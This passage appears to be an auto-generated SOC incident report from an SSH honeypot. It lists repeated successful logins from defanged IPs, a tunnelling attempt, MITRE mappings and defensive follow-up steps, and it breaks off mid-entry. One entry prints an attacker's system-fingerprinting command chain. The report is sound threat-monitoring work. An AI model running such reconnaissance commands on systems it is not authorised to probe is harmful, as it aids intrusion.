| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:15` | `cowrie.session.connect` |
| `2026-08-16 11:20:16` | `cowrie.login.success` |
| `2026-08-16 11:20:16` | `cowrie.session.params` |
| `2026-08-16 11:20:16` | `cowrie.log.closed` |
| `2026-08-16 11:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac8fc2bc8aa7

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:17` | `cowrie.session.connect` |
| `2026-08-16 11:20:17` | `cowrie.login.success` |
| `2026-08-16 11:20:17` | `cowrie.session.params` |
| `2026-08-16 11:20:18` | `cowrie.log.closed` |
| `2026-08-16 11:20:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32ebd5afdc4

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:18` | `cowrie.session.connect` |
| `2026-08-16 11:20:18` | `cowrie.login.success` |
| `2026-08-16 11:20:19` | `cowrie.session.params` |
| `2026-08-16 11:20:19` | `cowrie.log.closed` |
| `2026-08-16 11:20:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76cba140d209

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:19` | `cowrie.session.connect` |
| `2026-08-16 11:20:19` | `cowrie.login.success` |
| `2026-08-16 11:20:20` | `cowrie.session.params` |
| `2026-08-16 11:20:20` | `cowrie.log.closed` |
| `2026-08-16 11:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8453bc1743b3

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:20` | `cowrie.session.connect` |
| `2026-08-16 11:20:20` | `cowrie.login.success` |
| `2026-08-16 11:20:21` | `cowrie.session.params` |
| `2026-08-16 11:20:21` | `cowrie.log.closed` |
| `2026-08-16 11:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813915aeae02

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:21` | `cowrie.session.connect` |
| `2026-08-16 11:20:21` | `cowrie.login.success` |
| `2026-08-16 11:20:22` | `cowrie.session.params` |
| `2026-08-16 11:20:22` | `cowrie.log.closed` |
| `2026-08-16 11:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50fbfa0faf69

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:22` | `cowrie.session.connect` |
| `2026-08-16 11:20:23` | `cowrie.login.success` |
| `2026-08-16 11:20:23` | `cowrie.session.params` |
| `2026-08-16 11:20:23` | `cowrie.log.closed` |
| `2026-08-16 11:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64d598d69d3a

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:23` | `cowrie.session.connect` |
| `2026-08-16 11:20:24` | `cowrie.login.success` |
| `2026-08-16 11:20:24` | `cowrie.session.params` |
| `2026-08-16 11:20:24` | `cowrie.log.closed` |
| `2026-08-16 11:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6309b420b101

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:25` | `cowrie.session.connect` |
| `2026-08-16 11:20:25` | `cowrie.login.success` |
| `2026-08-16 11:20:26` | `cowrie.session.params` |
| `2026-08-16 11:20:26` | `cowrie.log.closed` |
| `2026-08-16 11:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae01493789b1

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:26` | `cowrie.session.connect` |
| `2026-08-16 11:20:26` | `cowrie.login.success` |
| `2026-08-16 11:20:27` | `cowrie.session.params` |
| `2026-08-16 11:20:27` | `cowrie.log.closed` |
| `2026-08-16 11:20:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39de8950fed4

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:27` | `cowrie.session.connect` |
| `2026-08-16 11:20:27` | `cowrie.login.success` |
| `2026-08-16 11:20:28` | `cowrie.session.params` |
| `2026-08-16 11:20:28` | `cowrie.log.closed` |
| `2026-08-16 11:20:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba6d8c997e0

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:28` | `cowrie.session.connect` |
| `2026-08-16 11:20:28` | `cowrie.login.success` |
| `2026-08-16 11:20:29` | `cowrie.session.params` |
| `2026-08-16 11:20:29` | `cowrie.log.closed` |
| `2026-08-16 11:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bd4ff72773e

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:29` | `cowrie.session.connect` |
| `2026-08-16 11:20:30` | `cowrie.login.success` |
| `2026-08-16 11:20:30` | `cowrie.session.params` |
| `2026-08-16 11:20:30` | `cowrie.log.closed` |
| `2026-08-16 11:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c32c8191fd7

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:30` | `cowrie.session.connect` |
| `2026-08-16 11:20:31` | `cowrie.login.success` |
| `2026-08-16 11:20:31` | `cowrie.session.params` |
| `2026-08-16 11:20:31` | `cowrie.log.closed` |
| `2026-08-16 11:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-916c13d9eba8

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:31` | `cowrie.session.connect` |
| `2026-08-16 11:20:32` | `cowrie.login.success` |
| `2026-08-16 11:20:32` | `cowrie.session.params` |
| `2026-08-16 11:20:32` | `cowrie.log.closed` |
| `2026-08-16 11:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2c7fa672aff

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:33` | `cowrie.session.connect` |
| `2026-08-16 11:20:33` | `cowrie.login.success` |
| `2026-08-16 11:20:33` | `cowrie.session.params` |
| `2026-08-16 11:20:34` | `cowrie.log.closed` |
| `2026-08-16 11:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09744ba71914

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:34` | `cowrie.session.connect` |
| `2026-08-16 11:20:34` | `cowrie.login.success` |
| `2026-08-16 11:20:35` | `cowrie.session.params` |
| `2026-08-16 11:20:35` | `cowrie.log.closed` |
| `2026-08-16 11:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f5791cbcd52

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:35` | `cowrie.session.connect` |
| `2026-08-16 11:20:35` | `cowrie.login.success` |
| `2026-08-16 11:20:36` | `cowrie.session.params` |
| `2026-08-16 11:20:36` | `cowrie.log.closed` |
| `2026-08-16 11:20:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cea0bd106ee0

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:36` | `cowrie.session.connect` |
| `2026-08-16 11:20:36` | `cowrie.login.success` |
| `2026-08-16 11:20:37` | `cowrie.session.params` |
| `2026-08-16 11:20:37` | `cowrie.log.closed` |
| `2026-08-16 11:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8eac5887f78

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:37` | `cowrie.session.connect` |
| `2026-08-16 11:20:38` | `cowrie.login.success` |
| `2026-08-16 11:20:38` | `cowrie.session.params` |
| `2026-08-16 11:20:38` | `cowrie.log.closed` |
| `2026-08-16 11:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de05ae22fde4

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:38` | `cowrie.session.connect` |
| `2026-08-16 11:20:39` | `cowrie.login.success` |
| `2026-08-16 11:20:39` | `cowrie.session.params` |
| `2026-08-16 11:20:39` | `cowrie.log.closed` |
| `2026-08-16 11:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9a2a09c8c91

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:39` | `cowrie.session.connect` |
| `2026-08-16 11:20:40` | `cowrie.login.success` |
| `2026-08-16 11:20:40` | `cowrie.session.params` |
| `2026-08-16 11:20:40` | `cowrie.log.closed` |
| `2026-08-16 11:20:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf371c5dc467

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:41` | `cowrie.session.connect` |
| `2026-08-16 11:20:41` | `cowrie.login.success` |
| `2026-08-16 11:20:42` | `cowrie.session.params` |
| `2026-08-16 11:20:42` | `cowrie.log.closed` |
| `2026-08-16 11:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc12e65bd3f4

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:42` | `cowrie.session.connect` |
| `2026-08-16 11:20:42` | `cowrie.login.success` |
| `2026-08-16 11:20:43` | `cowrie.session.params` |
| `2026-08-16 11:20:43` | `cowrie.log.closed` |
| `2026-08-16 11:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c154ff07635a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:43` | `cowrie.session.connect` |
| `2026-08-16 11:20:43` | `cowrie.client.version` |
| `2026-08-16 11:20:43` | `cowrie.client.kex` |
| `2026-08-16 11:20:45` | `cowrie.login.success` |
| `2026-08-16 11:20:48` | `cowrie.session.params` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.success` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:48` | `cowrie.command.input` |
| `2026-08-16 11:20:49` | `cowrie.log.closed` |
| `2026-08-16 11:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e7f3935456

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:43` | `cowrie.session.connect` |
| `2026-08-16 11:20:43` | `cowrie.login.success` |
| `2026-08-16 11:20:44` | `cowrie.session.params` |
| `2026-08-16 11:20:44` | `cowrie.log.closed` |
| `2026-08-16 11:20:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17d665ad5c5f

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:43` | `cowrie.session.connect` |
| `2026-08-16 11:20:44` | `cowrie.client.version` |
| `2026-08-16 11:20:44` | `cowrie.client.kex` |
| `2026-08-16 11:20:45` | `cowrie.login.success` |
| `2026-08-16 11:20:45` | `cowrie.direct-tcpip.request` |
| `2026-08-16 11:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ba995b242d

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:44` | `cowrie.session.connect` |
| `2026-08-16 11:20:45` | `cowrie.login.success` |
| `2026-08-16 11:20:45` | `cowrie.session.params` |
| `2026-08-16 11:20:45` | `cowrie.log.closed` |
| `2026-08-16 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2187a5b06ff6

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:45` | `cowrie.session.connect` |
| `2026-08-16 11:20:46` | `cowrie.login.success` |
| `2026-08-16 11:20:46` | `cowrie.session.params` |
| `2026-08-16 11:20:46` | `cowrie.log.closed` |
| `2026-08-16 11:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8634d4772ad

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:46` | `cowrie.session.connect` |
| `2026-08-16 11:20:47` | `cowrie.login.success` |
| `2026-08-16 11:20:47` | `cowrie.session.params` |
| `2026-08-16 11:20:48` | `cowrie.log.closed` |
| `2026-08-16 11:20:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7d78d580e2

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 11:20:48` | `cowrie.session.connect` |
| `2026-08-16 11:20:48` | `cowrie.login.success` |
| `2026-08-16 11:20:49` | `cowrie.session.params` |
| `2026-08-16 11:20:49` | `cowrie.log.closed` |
| `2026-08-16 11:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.22[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.5.22[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50cc8891ba9f

| Field | Detail |
|---|---|
| **Source IP** | `92.5.22[.]41` |
| **First Seen** | 2026-08-16 11:20 |
| **Last Seen** | 2026-08-16 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
